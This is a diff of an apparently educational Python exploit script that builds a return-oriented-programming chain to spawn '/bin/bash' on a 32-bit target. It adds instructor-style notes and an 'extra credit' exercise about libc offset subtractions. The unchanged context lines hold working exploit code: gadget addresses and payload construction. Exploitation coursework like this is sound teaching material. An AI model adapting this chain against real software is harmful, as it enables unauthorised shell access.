@@ -81,7 +81,11 @@ exploit.append(p(stage1addr+4*6))
 #   use gadget 0x8048368L:
 #     pop eax ; pop ebx ; leave ;; to setup eax and ebx for add
 exploit.append(p(0x8048368))
-#   libc offsets goes here with subtractions to avoid whitespace in value)
+#   libc offsets goes here with subtractions to avoid whitespace in value
+#   NOTE: subtracting 3 times avoids whitespace for the values we've seen.
+#     For extra credit, compute the number of subtractions required and
+#     modify the following code to handle a variable number of subtractions
+#     and the resulting moving of address offsets below.
 exploit.append(p(offset - 0x0804a024 - 0x0804a024 - 0x0804a024))
 #   set ebx to start of .data minus a constant: stage1addr - 0x5d5b04c4
 exploit.append(p(stage1addr-0x5d5b04c4))
@@ -89,6 +93,7 @@ exploit.append(p(stage1addr-0x5d5b04c4))
 exploit.append("junk")
 #   now correct eax by 3 times doing gadget 0x8048459L:
 #     add eax 0x804a024 ; add [ebx+0x5d5b04c4] eax ;;
+#   NOTE: number of adds should match number of subtractions above.
 exploit.append(p(0x8048459))
 exploit.append(p(0x8048459))
 exploit.append(p(0x8048459))
@@ -108,6 +113,7 @@ exploit.append(p(puts_PLT))
 #   the function isn't returning
 exploit.append("junk")
 # 1st argument is pointer to target bash = "/bin/bash"
+# NOTE: if computed number of adds above, this address must be adjusted.
 exploit.append(p(stage1addr+4*19))
 # 2nd argument is argument array (pointer to NULL 0x8048748)
 exploit.append(p( 0x8048748))
@@ -115,6 +121,7 @@ exploit.append(p( 0x8048748))
 exploit.append(p(0x8048748))
 # Here goes "/bin/bash"
 # Target bash =  = stage1addr + (4*19)
+# NOTE: if computed number of adds above, refs to this address must be adjusted.
 exploit.append("/bin/bash")
 
 # ******************************************************************************
